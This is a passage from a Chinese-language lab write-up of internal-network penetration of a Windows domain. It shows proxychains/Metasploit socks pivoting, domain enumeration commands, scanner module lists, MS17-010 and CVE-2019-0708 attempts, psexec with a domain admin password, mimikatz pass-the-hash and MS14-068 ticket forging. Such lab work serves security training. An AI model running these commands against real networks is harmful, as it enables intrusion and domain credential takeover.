    #然后打开/etc/proxychains.conf，加入下面一行
    socks4 0.0.0.0 1080
    ​
    #然后就可以使用nmap了
    proxychains nmap -p 21 -Pn -sT x.x.x.x     #在打开其他程序前加上proxychains
我们也可以在本机设置socks4代理，指向我们vps的1080端口。那么，我们本地的流量就会交给VPS的1080端口，而1080端口是MSF起的，MSF又添加了到内网的路由，自然我们就可以访问到内网的主机。
这里我实测用MSF挂的socks4a代理并不稳定，建议实战环境用 FRP 起的 socks5
代理，这里我为了省事直接用MSF的socks代理。其实新版的MSF也有了socks5代理，不过好像也不是很好用。
###
### 域信息收集
    net time /domain        #查看时间服务器
    net user /domain        #查看域用户
    net view /domain        #查看有几个域
    net group "domain computers" /domain         #查看域内所有的主机名
    net group "domain admins"   /domain          #查看域管理员
    net group "domain controllers" /domain       #查看域控
从域信息收集可以得到以下信息：
· 域：god.org
· 域内有三个用户：administrator、ligang、liukaifeng01
· 域内有三台主机：DEV1(不在此环境中)、ROOT-TVI862UBEH(192.168.52.141)、STU1(192.168.52.143)
· 域控：OWA(192.168.52.138)
· 域管理员：administrator
由此可见，我们现在获得的即是域管理员权限。此环境内还有一台ROOT-TVI862UBEH(192.168.52.141)和域控OWA(192.168.52.138)。
## 内网主机信息收集
我们现在想进行内网横向渗透，就需要收集更多的信息，内网渗透信息收集是非常重要的一步。
由于我们之前添加了路由信息并且挂了Socks4a代理，所以我们现在可以使用MSF里面的探测模块以及nmap对内网进行探测。
### 内网存活主机探测
这一步在域环境渗透中可以省略，因为使用域命令可以直接查询域中有哪些主机。在非域环境中渗透，可以使用这一步。在这里顺带提一下这个用法。更多的关于使用MSF进行内网探测，传送门：[后渗透阶段之基于MSF的内网主机探测](https://blog.csdn.net/qq_36119192/article/details/92556219)
    auxiliary/scanner/discovery/udp_sweep    #基于udp协议发现内网存活主机
    auxiliary/scanner/discovery/udp_probe    #基于udp协议发现内网存活主机
    auxiliary/scanner/netbios/nbname         #基于netbios协议发现内网存活主机
###
### 内网存活主机端口扫描
**1：使用MSF自带模块进行端口探测**
    auxiliary/scanner/portscan/tcp           #基于tcp进行端口扫描(默认扫描1-10000)
**2：使用 proxychains 代理链利用 nmap 对内网主机进行端口探测**
###
### 内网存活主机服务探测
    auxiliary/scanner/ftp/ftp_version            #发现内网ftp服务，基于默认21端口
    auxiliary/scanner/ssh/ssh_version            #发现内网ssh服务，基于默认22端口
    auxiliary/scanner/telnet/telnet_version      #发现内网telnet服务，基于默认23端口
    auxiliary/scanner/dns/dns_amp                #发现dns服务，基于默认53端口
    auxiliary/scanner/http/http_version          #发现内网http服务，基于默认80端口
    auxiliary/scanner/http/title                 #探测内网http服务的标题
    auxiliary/scanner/smb/smb_version            #发现内网smb服务，基于默认的445端口   
    auxiliary/scanner/mssql/mssql_schemadump     #发现内网SQLServer服务,基于默认的1433端口
    auxiliary/scanner/oracle/oracle_hashdump     #发现内网oracle服务,基于默认的1521端口 
    auxiliary/scanner/mysql/mysql_version        #发现内网mysql服务，基于默认3306端口
    auxiliary/scanner/rdp/rdp_scanner            #发现内网RDP服务，基于默认3389端口
    auxiliary/scanner/redis/redis_server         #发现内网Redis服务，基于默认6379端口
    auxiliary/scanner/db2/db2_version            #探测内网的db2服务，基于默认的50000端口
    auxiliary/scanner/netbios/nbname             #探测内网主机的netbios名字
经过了以上几步，我们就可以大致判断内网存活的主机、主机开放的端口以及服务这些基本信息了。
## 内网横向渗透攻击技巧
在对内网主机进行信息收集后，接下来我们就是要对内网主机发动攻击了。内网攻击方法有下面这些。
### MS17-010
永恒之蓝在内网渗透中是屡试不爽的，基本上一打一大片。但是MS17-010在实际红蓝对抗渗透中(通过代理打内网)并不好利用，MSF中自带的模块要打很多次才能成功一次，而且MSF自带的模块打sever2003的机器很容器蓝屏。注意这里的payload必须设置为正向连接
bind_tcp。
如下，第一次打就没打成功。
###
###
### CVE-2019-0708
该漏洞是今年爆出的一个windows
RDP协议的漏洞，但是测了一下，发现该主机不存在该漏洞。另外，该漏洞成功率也不高，而且极有可能把目标机打成蓝屏的结果。所以在真实红蓝对抗中不建议使用该漏洞，除非有百分百的把握能打成功。
###
###
### psexec攻击
我们已经获得了域管理员 god/administrator 的账号密码，我们现在可以使用该域管理员账号密码利用 psexec
登录域内任何一台开启了admin$共享(该共享默认开启) 的主机。
注：由于提示需要修改密码，所以已将 god/administrator 的密码改为 Password@ 。
    psexec.exe \\192.168.52.138 -u god\administrator -p Password@ cmd
但是在连接 Server2003服务器 的时候出了点小问题，提示服务没有及时响应启动或控制请求。
###
### 哈希传递攻击
在域环境内，只有获得了域管理员的哈希才可以攻击。这里假设我们得到了域管理员administrator的哈希，但是没有得到明文密码。在这里我们就可以用哈希传递攻击了。
在前面获得了域管理员 administrator 的NTLM哈希为：c456c606a647ef44b646c44a227917a4
    sekurlsa::pth /user:administrator /domain:"god.org" /ntlm:c456c606a647ef44b646c44a227917a4
###
### MS14-068
MS14-068漏洞适用于当我们获得了普通域用户的哈希，域控存在MS14-068漏洞的场景。我们现在想利用获得了普通域用户哈希去访问域控。
但是这里我们是直接获得了域管理员的哈希，这里只是演示下MS14-068漏洞的攻击手法
先获取需要利用的域用户的SID值
    #生成票据PI:EMAIL
    MS14-068.exe -u PI:EMAIL -p Password@ -s S-1-5-21-2952760202-1353902439-2381784089-500 -d 192.168.52.138       #MS14-068.exe -u 域用户@dog.org -p 域用户密码 -s 域用户的SID -d 域控ip
    ​
    #在mimikatz中导入票据
    kerberos::ptc  PI:EMAIL的路径
    ​
    ​
    然后再打开一个cmd窗口尝试访问域控
    dir \\192.168.52.138\c$
如果你想和我一起讨论的话，那就加入我的知识星球吧！